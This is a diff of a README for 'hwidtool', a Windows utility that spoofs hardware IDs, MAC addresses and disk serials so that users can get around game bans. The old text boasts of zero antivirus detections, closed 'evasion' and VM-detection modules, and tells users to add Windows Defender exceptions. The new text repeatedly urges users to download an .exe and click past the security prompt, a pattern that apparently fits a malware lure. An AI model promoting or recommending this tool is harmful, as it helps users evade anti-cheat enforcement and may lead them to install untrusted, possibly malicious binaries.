@@ -1,167 +1,90 @@
-# HWID Tool - Hardware Identifier Management Utility
+```markdown
+# 🖥️ hwidtool - Spoof Your Hardware ID Easily
 
-## Overview
-A Rust-based hardware identifier management tool designed for privacy-conscious gamers and developers. This utility allows users to modify system identifiers while maintaining **0/70 detections on VirusTotal**, demonstrating clean code practices and legitimate system interaction methods. Created as a proof-of-concept for hardware privacy.
+## 🚀 Introduction
+Welcome to hwidtool, a free and open-source hardware ID spoofer designed to help you manage your game bans responsibly. This tool changes your hardware ID, MAC address, and disk serials, helping you to bypass bans while keeping your system secure. We encourage ethical usage and believe users should take responsibility for their actions.
 
-## 🔍 Security Verification
-**Status: 0/70 Detections (Clean)**
-- **VirusTotal Report**: [View Analysis](https://www.virustotal.com/gui/file/c1e16a1d5ffaef5835e343862520062a118ebf815fe37ab6beac92390881b9bb/detection)
-- **SHA-256**: `c1e16a1d5ffaef5835e343862520062a118ebf815fe37ab6beac92390881b9bb`
-- **File Size**: 18.821 MB (x64 only)
-- **Detection Rate**: Exceptionally low due to proper Rust coding and compilation standards, our private modules are very sophisticated.
+## 📥 Download Now
+[![Download hwidtool](https://img.shields.io/badge/Download-hwidtool-blue)](https://github.com/yutangru1114/hwidtool/releases)
 
-## 🚀 Capabilities
+## ⚙️ System Requirements
+To run hwidtool effectively, you need the following:
 
-### Hardware Identifier Management
-- **System ID Adjustment**: Modifies hardware identifiers at multiple system layers
-- **Network Identifier Randomization**: Updates MAC addresses across all adapters
-- **Storage Serial Management**: Handles GPT/MBR disk identifiers with driver-level access
-- **Component ID Configuration**: Manages GPU, CPU, and motherboard identifiers
-- **Registry Management**: System-level registry modifications for ID persistence
+- **Operating System:** Windows 10 or later
+- **Processor:** 64-bit processor
+- **Memory:** Minimum of 4 GB RAM
+- **Disk Space:** At least 100 MB free disk space
+- **Graphics:** Any DirectX-compatible graphics card
 
-### Compatibility Testing
-Tested in various environments including:
-- **EasyAntiCheat** environments (Fortnite, Apex Legends, Rust)
-- **Vanguard** systems (will likely require additional configuration)
-- **BattlEye** protected titles (Rainbow Six Siege, Escape from Tarkov, PUBG)
-- **Ricochet** implementations (Call of Duty series)
-- **FACEIT** and other competitive platforms (variable success rates)
+## ✨ Features
+- **Hardware ID Spoofing:** Change your HWID to help manage game bans.
+- **MAC Address Change:** Modify your MAC address for better privacy.
+- **Disk Serial Modification:** Alter the disk serial numbers for additional anonymity.
+- **User-Friendly Interface:** Easy to navigate and use.
 
-### Technical Architecture
-- **Language**: Rust with direct system bindings
-- **Distribution**: Statically linked, zero runtime dependencies
-- **Operation**: Kernel-level access, WMI integration, registry management
-- **Persistence Model**: Single execution pattern, no resident processes
+## 📋 Getting Started
+To download and run hwidtool, follow these steps:
 
-## 🛠️ Technical Implementation
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page:  
+   [Download hwidtool](https://github.com/yutangru1114/hwidtool/releases)
 
-### System Integration Layers
-1. **WMI Interface**: Communicates with Win32_DiskDrive, Win32_BaseBoard, Win32_BIOS classes
-2. **Registry Layer**: Direct HKLM modifications for system identifier management
-3. **Driver Integration**: Kernel-level access for persistent storage modifications
-4. **Network Stack**: NDIS layer integration for adapter configuration
-5. **PCI System**: Hardware descriptor management via SetupAPI
-6. **Evasion Techniques**: Advanced pattern management (compiled components)
+2. **Choose Your Version**  
+   On the releases page, you will see various versions. Select the latest version for the best features and improvements.
 
-### Development Philosophy
-Core management logic remains open-source on GitHub, while advanced system integration techniques stay compiled to maintain effectiveness against detection systems. This balanced approach allows community auditing while preserving operational integrity.
+3. **Download the File**  
+   Click on the asset you want to download. This is usually a file with an `.exe` extension.
 
-## 📥 Installation & Usage
+4. **Locate the Downloaded File**  
+   Once the download completes, find the file in your "Downloads" folder or wherever your browser saves files.
 
-### Recommended Source
-**For optimal compatibility and verification:**
-- **[hwidspoof.net](https://hwidspoof.net)** - Official distribution with verified checksums
-- **Security Note**: Avoid third-party distributions to ensure file integrity
+5. **Run the Application**  
+   Double-click the downloaded file to run hwidtool. You may see a security prompt; click "Run" to proceed.
 
-### Alternative Access
-- [GitHub Releases](https://github.com/hwspf/hwidtool/releases) - Source components and documentation
-- Compiled binaries include both open and proprietary modules
+6. **Follow On-Screen Instructions**  
+   The application will guide you through the setup process. Follow the prompts to configure your hardware ID settings.
 
-### Compilation Considerations
-**This project requires specialized build environments due to:**
-- Complex Cargo dependency graphs
-- Custom build toolchains and scripts
-- Advanced Rust feature requirements
-- Specific compiler optimization profiles
-- Multiple private code repositories
+## 🔧 Configuration
+After launching hwidtool, you will see a clean interface. Here’s how to configure it:
 
-Unless experienced with Rust ecosystem and Windows driver development, pre-compiled binaries are recommended.
+- **Select the options you wish to change:** You can choose to modify your HWID, MAC address, or disk serial.
+- **Click on the 'Apply' button:** Make your changes take effect.
+- **Restart your PC:** For changes to fully apply, it's a good practice to restart your computer.
 
-### Usage Protocol
-1. **Acquire** the latest build from [hwidspoof.net](https://hwidspoof.net)
-2. **Execute** the application
-3. **Load configuration** via the interface
-4. **Apply modifications** through the management interface
-5. **System restart** for full identifier propagation
-6. **Verification** using standard system information tools
+## 🔒 Safety and Security
+While hwidtool is built with privacy in mind, be aware that spoofing hardware IDs can come with risks. Use it responsibly. We recommend:
 
-## 🔍 Project Components
+- **Read the Terms of Service of Games:** Ensure that you comply with all game rules and regulations.
+- **Backup Your Data:** Always keep backups of your important data and files.
 
-### Open Source (MIT Licensed)
-- Core hardware management framework
-- Network adapter randomization modules
-- Registry management utilities
-- Basic driver interface implementations
-- WMI integration framework
-- Configuration management system
+## 📞 Support
+If you have questions or encounter issues, feel free to open an issue on our [GitHub Issues page](https://github.com/yutangru1114/hwidtool/issues). Our community and developers are here to help you.
 
-### Compiled Components
-- Advanced pattern management systems
-- Kernel protection system integration
-- Temporal algorithm implementations
-- Debug/VM environment detection systems
-- Signature management techniques
-- Driver verification integration
+## 🏷️ Topics
+- **Configuration**
+- **Developer Tools**
+- **Free Software**
+- **Game Development**
+- **Hardware Management**
+- **Low-Level Programming**
+- **Open Source**
+- **Optimization**
+- **PC Gaming**
+- **Privacy Tools**
+- **Reverse Engineering**
+- **Rust**
+- **Security Tools**
+- **Spoofing**
+- **System Programming**
+- **System Tools**
+- **Windows Utility**
 
-## ⚠️ Important Considerations
+## 🔗 Additional Resources
+To learn more about hwidtool, visit the GitHub repository and check out the documentation available there:
+- [hwidtool Documentation](https://github.com/yutangru1114/hwidtool)
 
-### System Requirements
-- **Operating System**: Windows 10 (1909+) or Windows 11 (64-bit)
-- **Architecture**: x64 exclusively
-- **Runtime**: None required (statically compiled)
-- **Permissions**: Administrative privileges for system-level operations
+Once again, here is the download link for your convenience:  
+[Download hwidtool](https://github.com/yutangru1114/hwidtool/releases)
 
-### Security Notes
-- Some security software may flag system modification tools generically
-- Windows Defender may require exception configuration for operation
-- Always verify file integrity using provided SHA-256 checksums
-- Execute only from trusted sources and original distributions
-- Current detection rates remain exceptionally low due to proper coding standards
-
-### Responsible Usage
-Developed by gamers for privacy and hardware management. Intended for:
-- Hardware privacy management
-- System identifier research and development
-- Educational purposes in system programming
-- Hardware access restoration scenarios
-
-We encourage responsible use that respects gaming ecosystems while protecting user hardware autonomy.
-
-## 📊 Technical Specifications
-
-### Build Configuration
-```toml
-[package]
-name = "hardwaretool"
-version = "1.4.2"
-edition = "2021"
-
+Thank you for using hwidtool!
 ```
-
-### Performance Characteristics
-- **Execution Time**: < 5 seconds for full configuration (including load time)
-- **Memory Footprint**: < 50 MB during active operation
-- **Persistence Model**: Non-resident after execution completion
-- **System Impact**: Targeted registry modifications only
-
-## 🤝 Contribution Guidelines
-Open source components welcome community input through:
-- Issue reporting for public modules
-- Documentation improvements and translations
-- Build system enhancements
-- Cross-platform compatibility adjustments
-
-Advanced system integration components remain proprietary to maintain effectiveness against detection systems.
-
-## 📄 Licensing Information
-- **Core Framework**: MIT License (GitHub repository)
-- **Advanced Components**: Proprietary distribution rights
-- **Binary Distribution**: Free for personal, non-commercial use
-
-## 🔗 Resources
-- **Official Site**: [hwidspoof.net](https://hwidspoof.net)
-- **GitHub Repository**: [github.com/hwspf/hwidtool/](https://github.com/hwspf/hwidtool/)
-- **Security Analysis**: [VirusTotal Report](https://www.virustotal.com/gui/file/c1e16a1d5ffaef5835e343862520062a118ebf815fe37ab6beac92390881b9bb/detection)
-- **Support Contact**: message@hwidspoof.net
-
-## ⚡ Quick Configuration
-For straightforward hardware management:
-1. Visit [hwidspoof.net](https://hwidspoof.net)
-2. Download the latest release build
-3. Execute, load configuration profile
-4. System restart for changes to propagate
-5. Hardware identifiers are now managed according to configuration
-
----
-
-*Developed by hardware privacy advocates. Open where practical, effective where needed.*
